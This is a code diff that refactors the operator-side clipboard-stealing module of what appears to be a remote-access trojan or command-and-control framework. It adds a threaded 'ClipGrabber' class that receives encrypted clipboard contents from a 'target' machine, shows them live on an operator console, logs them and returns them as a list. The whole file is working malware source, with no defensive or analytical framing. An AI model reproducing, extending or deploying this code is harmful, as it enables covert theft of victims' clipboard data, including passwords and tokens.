@@ -1,4 +1,13 @@
-"""Utility functions for capturing clipboard data from the client."""
+"""Utilities for reliable clipboard capture from a client."""
+
+from __future__ import annotations
+
+import socket
+import threading
+import time
+from typing import List
+
+from termcolor import colored
 
 from components.networking import (
     decrypt_message,
@@ -6,86 +15,118 @@ from components.networking import (
     clear_socket_buffer,
 )
 from components.logging import log_activity
-from termcolor import colored
-import socket
-import time
 
-def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket, key: bytes) -> str:
-    """Handle the clipboard stealing routine.
 
-    Parameters
-    ----------
-    client_output: bytes
-        Initial message from the client signalling the clipboard listener
-        has started on their side.
-    conn_obj: socket.socket
-        Active socket connection with the client.
+class ClipGrabber:
+    """Continuously receive clipboard data while allowing operator interaction."""
 
-    Returns
-    -------
-    str
-        Aggregated clipboard data or an error message.
-    """
+    def __init__(self, conn_obj: socket.socket, key: bytes) -> None:
+        self.conn_obj = conn_obj
+        self.key = key
+        self.stop_event = threading.Event()
+        self.received: List[str] = []
+        self.lock = threading.Lock()
+        self._original_timeout = conn_obj.gettimeout()
 
-    received_data = []
+    # ------------------------------------------------------------------
+    def _listen_clipboard(self) -> None:
+        """Background thread for receiving clipboard entries from the client."""
 
-    decrypted_client_message = decrypt_message(client_output, key)  # Signal message
-    if decrypted_client_message.decode() != "STARTED":
-        return colored("[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.", "red")
+        self.conn_obj.settimeout(0.5)
+        while not self.stop_event.is_set():
+            try:
+                data = decrypt_message(self.conn_obj.recv(4096), self.key)
+                if not data:
+                    continue
+                decoded = data.decode().strip()
+                if not decoded:
+                    continue
+                with self.lock:
+                    self.received.extend(decoded.split("\n"))
+                print(colored(f"[CLIP] {decoded}", "green"))
+            except socket.timeout:
+                continue
+            except Exception as e:  # pragma: no cover - network errors
+                print(f"[-] Error receiving clipboard data: {e}")
+                break
 
-    original_timeout = conn_obj.gettimeout()
-    # Use a short timeout while waiting for clipboard data
-    conn_obj.settimeout(0.5)
-    print(
-        f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
-    )
-    
-    try:
-        # Wait until the operator interrupts the loop with CTRL+C
-        while True:
-            input("Press Ctrl+C to stop and receive clipboard data: ")
-    except KeyboardInterrupt:
-        conn_obj.sendall(encrypt_message("END", key))
+    # ------------------------------------------------------------------
+    def _user_input(self) -> None:
+        """Allow the operator to stop clipboard collection."""
+
+        while not self.stop_event.is_set():
+            try:
+                cmd = input("clipgrabber > ").strip().lower()
+                if cmd in {"exit", "quit"}:
+                    self.conn_obj.sendall(encrypt_message("END", self.key))
+                    self.stop_event.set()
+                elif cmd:
+                    print("Unknown command. Type 'exit' to stop.")
+            except KeyboardInterrupt:
+                self.conn_obj.sendall(encrypt_message("END", self.key))
+                self.stop_event.set()
+
+    # ------------------------------------------------------------------
+    def run(self) -> str:
+        """Start listening threads and return aggregated clipboard data."""
+
+        print(
+            f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
+        )
+
+        listener = threading.Thread(target=self._listen_clipboard, daemon=True)
+        input_thread = threading.Thread(target=self._user_input)
+
+        listener.start()
+        input_thread.start()
+
+        input_thread.join()
+        self.stop_event.set()
+        listener.join()
+
         print(
             f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
         )
-        print()  # Clear any input clutter
 
-    # Attempt to receive any buffered clipboard entries after the interrupt
-    try:
-        while True:
-            try:
-                output = decrypt_message(conn_obj.recv(4096), key)
-                if output:
-                    decoded_output = output.strip().decode() 
-                    received_data.extend(decoded_output.split("\n"))
-                else:
-                    break
-            except socket.timeout:
-                break
-    except Exception as e:
-        print(f"[-] Error when trying to gather clipboard data: {e}")
+        # Restore state and cleanup
+        self.conn_obj.settimeout(self._original_timeout)
+        clear_socket_buffer(self.conn_obj)
 
-    try:
-        if not received_data:
-            log_activity(f"No clipboard entries have been gathered.", "info")
-        
+        if not self.received:
+            log_activity("No clipboard entries have been gathered.", "info")
             return "[-] No clipboard data gathered from target"
-        else:
-            print("Loading clipboard data . . .")
-            print("Gathered clipboard data :")
-            # Reorganise output
-            result, counter = [], 0
-            for data in received_data:
-                counter += 1
-                if data:
-                    result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))
 
-            # Report gathered entries
-            log_activity(f"Gathered {len(result)} clipboard entries.", "info")
-            
-            return "\n".join(result) 
-    finally:
-        # Ensure socket state is restored for subsequent commands
-        conn_obj.settimeout(original_timeout)
-        clear_socket_buffer(conn_obj)
+        result = []
+        for idx, entry in enumerate(self.received, 1):
+            entry = entry.strip()
+            if entry:
+                result.append(colored(f"[+] Clipboard Entry {idx} -> {entry}", "green"))
+
+        log_activity(f"Gathered {len(result)} clipboard entries.", "info")
+        return "\n".join(result)
+
+
+def clipboard_steal_command(
+    client_output: bytes, conn_obj: socket.socket, key: bytes
+) -> str:
+    """Entry point used by the framework to start the clipboard grabber."""
+
+    message = decrypt_message(client_output, key)
+    if not message:
+        return colored(
+            "[-] An error has occurred when starting the clipboard steal function. Please try again in a few moments.",
+            "red",
+        )
+
+    decoded = message.decode()
+    if decoded == "NOCLIP":
+        return colored("[-] Target has no clipboard capabilities.", "red")
+    if decoded != "STARTED":
+        return colored(
+            "[-] An error has occurred when starting the clipboard steal function. Please try again in a few moments.",
+            "red",
+        )
+
+    grabber = ClipGrabber(conn_obj, key)
+    return grabber.run()
+
